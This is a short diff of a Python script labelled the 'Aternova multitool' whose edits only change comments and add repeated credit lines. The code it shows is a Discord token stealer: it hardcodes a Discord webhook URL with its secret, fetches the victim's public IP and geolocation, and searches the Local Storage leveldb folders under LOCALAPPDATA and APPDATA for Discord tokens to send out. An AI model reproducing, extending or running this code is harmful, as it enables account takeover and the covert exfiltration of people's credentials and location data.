@@ -5,7 +5,11 @@ import re
 from dhooks import Webhook, Embed
 from datetime import datetime
 
-# Discord webhook
+#Credits: coded by haribv, This is the Aternova multitool! Please leave a Star on Github!!!
+#Credits: coded by haribv, This is the Aternova multitool! Please leave a Star on Github!!!
+#Credits: coded by haribv, This is the Aternova multitool! Please leave a Star on Github!!!
+
+# WEBHOOK
 hook = Webhook("https://discord.com/api/webhooks/1212886195508482128/Bc0NpIpOp9QxoN_EsO8gMt1gXsiBNqPXeYl-kXKKA6zwgzAlV-h5yOADYXlhvVX56w_A")
 
 ip = requests.get('https://api.ipify.org/').text
@@ -28,7 +32,7 @@ fields = [
     {'name': 'ASN',   'value': geo['as'].get('asn')}
 ]
 
-# Function to find Discord tokens
+# FIND TOKEN
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
 
@@ -44,7 +48,7 @@ def find_tokens(path):
                     tokens.append(token)
     return tokens
 
-# Run the main function
+# RUN MAIN
 def main():
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
